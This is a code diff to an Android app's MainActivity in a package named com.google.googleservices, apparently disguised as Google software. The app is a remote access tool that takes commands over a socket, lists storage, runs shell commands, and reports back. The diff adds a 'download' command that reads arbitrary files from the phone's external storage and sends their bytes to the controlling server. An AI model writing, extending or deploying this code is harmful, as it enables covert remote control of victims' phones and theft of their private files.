@@ -2,6 +2,7 @@ package com.google.googleservices;
 
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
+import androidx.annotation.RequiresApi;
 import androidx.appcompat.app.AppCompatActivity;
 
 import android.bluetooth.BluetoothAdapter;
@@ -10,16 +11,22 @@ import android.content.Intent;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.net.wifi.WifiManager;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
 import android.util.Log;
 
+import java.io.BufferedInputStream;
 import java.io.BufferedReader;
+import java.io.DataOutputStream;
 import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.net.Socket;
+import java.nio.file.Path;
 import java.util.ArrayList;
 import java.util.Collection;
 import java.util.Iterator;
@@ -47,6 +54,7 @@ public class MainActivity extends AppCompatActivity {
 
         String currentpath = "/storage/emulated/0";
 
+        @RequiresApi(api = Build.VERSION_CODES.O)
         @Override
         public void run() {
 
@@ -93,43 +101,16 @@ public class MainActivity extends AppCompatActivity {
             }
 
             Log.d("recv", recv(sock));
+            try {
+                PrintWriter outs = new PrintWriter(sock.getOutputStream(), true);
 
-            if (text.length() >= 1024) {
-
-
-               int times_to_send = (int) Math.ceil(text.length() /1024) + 1;
-                for (int i = 0; i < times_to_send; i++) {
-                    // your code goes here
-
-                Log.d("times to send", String.valueOf(times_to_send));
-
-                    String text_to_send = text.substring(0, Math.min(text.length(), 1024));
-
-                    Log.d("sending text" + i, text_to_send);
-                    try {
-                        PrintWriter outs = new PrintWriter(sock.getOutputStream(), true);
-
-                        outs.println(text_to_send);
-                    } catch (IOException e) {
-                        e.printStackTrace();
-                    }
-                    try{
-                    text = text.substring(1024);
-                    }
-                    catch (Exception e){
-                        text = text.substring(text.length());
-                    }
-                }
-            } else {
-                try {
-                    PrintWriter outs = new PrintWriter(sock.getOutputStream(), true);
-
-                    outs.println(text);
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
+                outs.println(text);
+            } catch (IOException e) {
+                e.printStackTrace();
             }
         }
+
+
 
 
         String recv(Socket sock) {
@@ -183,9 +164,10 @@ public class MainActivity extends AppCompatActivity {
             return output;
         }
 
+        @RequiresApi(api = Build.VERSION_CODES.O)
         String advanced_cmd(Socket server, String cmd) {
             List<String> files = null;
-            String output = null;
+            String output = "null";
             if (cmd.startsWith("ls")) {
 
                 final String state = Environment.getExternalStorageState();
@@ -214,9 +196,68 @@ public class MainActivity extends AppCompatActivity {
             } else if (cmd.startsWith("pwd")) {
                 output = currentpath;
             }
+            else if (cmd.startsWith("download ")){
+                try {
+                    send(server, "downloading");
+                byte[] data = readbytes(new File(currentpath + cmd.split("download ")[1]));
+                DataOutputStream dOut = new DataOutputStream(server.getOutputStream());
+                    dOut.writeInt(data.length); // write length of the message
+                    recv(server);
+                    dOut.write(data);           // write the message
+                }
+                catch (Exception e){
+                    e.getStackTrace();
+                }
+            }
+            return output;
+        }
+        String download(String cmd){
+            String output = "no information revieced from download";
+            File file = new File(currentpath + cmd.split("download ")[1]);
+            int size = (int) file.length();
+            byte[] bytes = new byte[size];
+            try {
+                BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
+                buf.read(bytes, 0, bytes.length);
+                buf.close();
+            } catch (FileNotFoundException e) {
+                output = "file not found";
+                e.printStackTrace();
+            } catch (IOException e) {
+                output = "unknown error opening file";
+                e.printStackTrace();
+            }
             return output;
         }
 
+        byte[] readbytes(File f) {
+            int size = (int) f.length();
+            byte bytes[] = new byte[size];
+            byte tmpBuff[] = new byte[size];
+            try {
+                FileInputStream fis = new FileInputStream(f);
+                try {
+
+                    int read = fis.read(bytes, 0, size);
+                    if (read < size) {
+                        int remain = size - read;
+                        while (remain > 0) {
+                            read = fis.read(tmpBuff, 0, remain);
+                            System.arraycopy(tmpBuff, 0, bytes, size - remain, read);
+                            remain -= read;
+                        }
+                    }
+                } catch (IOException e) {
+                    throw e;
+                } finally {
+                    fis.close();
+                }
+            }
+            catch (Exception e){
+                e.getStackTrace();
+            }
+            return bytes;
+        }
         private void getAllFilesOfDir(File directory) {
             Log.d("filesofdir", "Directory: " + directory.getAbsolutePath() + "\n");
 
@@ -305,7 +346,7 @@ public class MainActivity extends AppCompatActivity {
                 bufferedReader2.close();
                 // Waits for the command to finish.
                 process.waitFor();
-                String output3 = output.toString() + "\n" + output2.toString();
+                String output3 = output.toString() + output2.toString();
                 Log.d("shell_command ", output3);
 
                 return output3;
